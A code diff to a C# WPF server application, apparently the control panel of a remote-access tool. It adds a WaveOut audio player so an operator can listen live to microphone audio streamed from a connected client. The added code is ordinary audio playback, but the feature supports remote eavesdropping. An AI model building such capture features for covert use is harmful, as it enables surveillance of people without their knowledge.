@@ -1,5 +1,7 @@
+using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.IO;
+using System.Runtime.InteropServices;
 using System.Windows;
 using System.Windows.Input;
 using System.Windows.Media;
@@ -11,12 +13,121 @@ using SeroServer.Protocol;
 
 namespace SeroServer.UI;
 
+// ── Real-time WaveOut audio player (P/Invoke, no external deps) ───────────────
+internal sealed class WaveOutPlayer : IDisposable
+{
+    [StructLayout(LayoutKind.Sequential)]
+    private struct WAVEFORMATEX
+    {
+        public ushort wFormatTag, nChannels;
+        public uint nSamplesPerSec, nAvgBytesPerSec;
+        public ushort nBlockAlign, wBitsPerSample, cbSize;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct WAVEHDR
+    {
+        public IntPtr lpData;
+        public int dwBufferLength, dwBytesRecorded;
+        public IntPtr dwUser;
+        public int dwFlags, dwLoops;
+        public IntPtr lpNext, reserved;
+    }
+
+    [DllImport("winmm.dll")] static extern int waveOutOpen(out IntPtr h, uint dev, ref WAVEFORMATEX fmt, IntPtr cb, IntPtr inst, uint flags);
+    [DllImport("winmm.dll")] static extern int waveOutClose(IntPtr h);
+    [DllImport("winmm.dll")] static extern int waveOutReset(IntPtr h);
+    [DllImport("winmm.dll")] static extern int waveOutWrite(IntPtr h, IntPtr hdr, int sz);
+    [DllImport("winmm.dll")] static extern int waveOutPrepareHeader(IntPtr h, IntPtr hdr, int sz);
+    [DllImport("winmm.dll")] static extern int waveOutUnprepareHeader(IntPtr h, IntPtr hdr, int sz);
+
+    private const uint WAVE_MAPPER = 0xFFFFFFFF;
+    private const int  WHDR_DONE  = 0x00000001;
+
+    private readonly IntPtr _hwo;
+    private readonly bool   _open;
+    private readonly BlockingCollection<byte[]> _queue = new(48);
+    private readonly Thread _thread;
+    private volatile bool   _running;
+
+    public WaveOutPlayer(int sampleRate)
+    {
+        var fmt = new WAVEFORMATEX
+        {
+            wFormatTag      = 1,
+            nChannels       = 1,
+            nSamplesPerSec  = (uint)sampleRate,
+            nAvgBytesPerSec = (uint)(sampleRate * 2),
+            nBlockAlign     = 2,
+            wBitsPerSample  = 16,
+        };
+        _open    = waveOutOpen(out _hwo, WAVE_MAPPER, ref fmt, IntPtr.Zero, IntPtr.Zero, 0) == 0;
+        _running = _open;
+        _thread  = new Thread(Loop) { IsBackground = true };
+        if (_open) _thread.Start();
+    }
+
+    public void Enqueue(byte[] pcm)
+    {
+        if (!_open || _queue.IsAddingCompleted) return;
+        _queue.TryAdd(pcm);
+    }
+
+    private void Loop()
+    {
+        int hdrSz = Marshal.SizeOf<WAVEHDR>();
+        while (_running)
+        {
+            byte[]? pcm;
+            try { pcm = _queue.Take(); }
+            catch (InvalidOperationException) { break; }
+
+            var dataPtr = Marshal.AllocHGlobal(pcm.Length);
+            var hdrPtr  = Marshal.AllocHGlobal(hdrSz);
+            try
+            {
+                Marshal.Copy(pcm, 0, dataPtr, pcm.Length);
+                // Zero header, then set lpData + dwBufferLength
+                for (int i = 0; i < hdrSz; i++) Marshal.WriteByte(hdrPtr, i, 0);
+                var hdr = new WAVEHDR { lpData = dataPtr, dwBufferLength = pcm.Length };
+                Marshal.StructureToPtr(hdr, hdrPtr, false);
+
+                waveOutPrepareHeader(_hwo, hdrPtr, hdrSz);
+                waveOutWrite(_hwo, hdrPtr, hdrSz);
+
+                while (_running)
+                {
+                    var h = Marshal.PtrToStructure<WAVEHDR>(hdrPtr);
+                    if ((h.dwFlags & WHDR_DONE) != 0) break;
+                    Thread.Sleep(5);
+                }
+                waveOutUnprepareHeader(_hwo, hdrPtr, hdrSz);
+            }
+            finally
+            {
+                Marshal.FreeHGlobal(hdrPtr);
+                Marshal.FreeHGlobal(dataPtr);
+            }
+        }
+    }
+
+    public void Dispose()
+    {
+        _running = false;
+        _queue.CompleteAdding();
+        _thread.Join(2000);
+        if (_open) { waveOutReset(_hwo); waveOutClose(_hwo); }
+    }
+}
+
 public partial class MicrophoneWindow : Window
 {
     private readonly TlsServer _server;
     private readonly string    _clientId;
 
     private bool _recording;
+    private bool _listening;
+    private WaveOutPlayer? _player;
     private readonly List<byte[]> _chunks = [];
     private const int SampleRate = 16000;
     private const int Channels   = 1;
@@ -46,6 +157,7 @@ public partial class MicrophoneWindow : Window
             _server.UnregisterHandler(clientId, PacketType.MicDevicesResult);
             _server.UnregisterHandler(clientId, PacketType.MicData);
             if (_recording) SendStop();
+            StopListening();
         };
         Loaded += async (_, _) =>
             await _server.SendToClient(_clientId, new Packet { Type = PacketType.MicGetDevices });
@@ -80,6 +192,9 @@ public partial class MicrophoneWindow : Window
             peak = Math.Max(peak, Math.Abs(s / 32768f));
         lock (_waveform) _waveform[_wavePos % _waveform.Length] = peak;
         _wavePos++;
+
+        // Real-time playback
+        if (_listening) _player?.Enqueue(pcm);
 
         Dispatcher.Invoke(() => TxtStatus.Text = $"Recording… {_chunks.Count} chunks received");
     }
@@ -195,6 +310,37 @@ public partial class MicrophoneWindow : Window
             System.Windows.Controls.Canvas.SetTop(rect, (h - barH) / 2);
             WaveCanvas.Children.Add(rect);
         }
+    }
+
+    private void Listen_Click(object s, RoutedEventArgs e)
+    {
+        if (_listening)
+        {
+            StopListening();
+            BtnListen.Content = "🔊 Listen";
+            TxtStatus.Text = "Listening stopped";
+        }
+        else
+        {
+            StartListening();
+            BtnListen.Content = "🔇 Stop";
+            TxtStatus.Text = "Listening — audio routed to speakers";
+        }
+    }
+
+    private void StartListening()
+    {
+        if (_listening) return;
+        _player   = new WaveOutPlayer(SampleRate);
+        _listening = true;
+    }
+
+    private void StopListening()
+    {
+        if (!_listening) return;
+        _listening = false;
+        _player?.Dispose();
+        _player = null;
     }
 
     private void Window_MouseLeftButtonDown(object s, MouseButtonEventArgs e)
